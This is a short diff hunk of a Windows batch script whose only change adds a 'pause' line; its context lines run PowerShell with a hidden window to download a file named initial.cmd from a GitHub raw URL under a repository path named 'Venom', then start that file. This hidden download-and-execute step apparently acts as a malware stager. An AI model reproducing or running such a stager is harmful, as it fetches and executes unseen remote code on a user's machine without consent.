@@ -43,7 +43,7 @@ call :check_internet
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/initial.cmd -OutFile initial.cmd"
 
 start initial.cmd
-
+pause
 @rem exit process
 :end
 exit
